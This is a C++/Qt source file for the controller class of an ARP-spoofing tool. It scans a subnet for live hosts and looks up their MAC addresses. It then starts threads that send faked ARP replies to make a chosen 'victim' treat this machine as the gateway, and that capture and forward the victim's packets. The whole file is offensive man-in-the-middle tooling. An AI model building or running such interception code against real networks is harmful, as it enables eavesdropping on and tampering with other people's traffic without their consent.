#include "hacker.h"
#include "arpsender.h"
#include "mainwindow.h"
#include "hostinfo.h"
#include "getonlineipsthread.h"
#include "sendnoofingthread.h"
#include "getpacketsthread.h"
#include "global_define.h"

#include <QDebug>
#include <QFile>

Hacker::Hacker(QObject *parent)
    : main_ui((MainWindow*)parent),
      ipResolver(NULL),
      arpSender(NULL),
      getOnlineIPsThread(NULL),
      sendArpSnoofingThread(NULL),
      getPacketsThread(NULL),
      hostInfo(new HostInfo())
{
    hostInfo->hostInfoInit();
}

Hacker::~Hacker()
{
    if(getOnlineIPsThread != NULL){
        delete getOnlineIPsThread;
    }
    if(arpSender != NULL){
        delete arpSender;
    }
    if(ipResolver != NULL){
        delete ipResolver;
    }
    if(sendArpSnoofingThread != NULL){
        delete sendArpSnoofingThread;
    }
    if(getPacketsThread != NULL){
        delete getPacketsThread;
    }
    delete hostInfo;
}

//Called by UI thread.
//create a thread to get online ips.
void Hacker::getOnlineIPs(int startIP, int endIP)
{
    if(getOnlineIPsThread == NULL)
        getOnlineIPsThread = new GetOnlineIPsThread(this, startIP, endIP);

    //When one ip is found or scan is finished, tell the UI.
    connect(getOnlineIPsThread, SIGNAL(foundOneOnlineIP(QString)), main_ui, SLOT(oneOnlineIPFound(QString)));
    connect(getOnlineIPsThread, SIGNAL(scanHasFinished()), main_ui, SLOT(scanDone()));
    connect(getOnlineIPsThread, SIGNAL(scanProgressForward(int)), main_ui, SLOT(updateProgress(int)));

    getOnlineIPsThread->start();
}

QString Hacker::getHostname(const QString &ip)
{
    if(ipResolver == NULL)
        ipResolver = new IPTools();
    QString hostname = ipResolver->getHostname(ip);
    return hostname;
}

/* Query the MAC address of destination ip. */
void Hacker::queryMacAddress(const QString& dest_ip)
{
    if(arpSender == NULL){
        arpSender = new ARPSender();
    }
    connect(arpSender, SIGNAL(macAddressReturned(QString)), main_ui, SLOT(showMacAddress(QString)));
    arpSender->queryMacAddress(dest_ip);
}

/* Lie to the dest_ip that we're the gateway */
void Hacker::makeHostRedirectToMe(const QString& dest_ip)
{
    if(arpSender == NULL){
        arpSender = new ARPSender();
    }
    if(sendArpSnoofingThread == NULL){
        sendArpSnoofingThread = new SendArpSnoofingThread(arpSender, dest_ip);
    }
    if(getPacketsThread == NULL){
        getPacketsThread = new GetPacketsThread();
    }

    //When click "stop" from UI, sendArpSnoofingThread should react to that signal and stop sending.
    connect(main_ui, SIGNAL(stopHacking()), sendArpSnoofingThread, SLOT(stopSendFakedARP()));
    connect(arpSender, SIGNAL(macAddressReturned(QString)), this, SLOT(startPackerForwarding(QString)));

    getPacketsThread->setVictimIpAddr(dest_ip);
    queryMacAddress(dest_ip);

    sendArpSnoofingThread->start();
}

void Hacker::startPackerForwarding(const QString &mac_addr)
{
//    if(getPacketsThread->isRunning())
//        getPacketsThread->terminate();

    getPacketsThread->setVictimMacAddr(mac_addr);
    getPacketsThread->start();
}
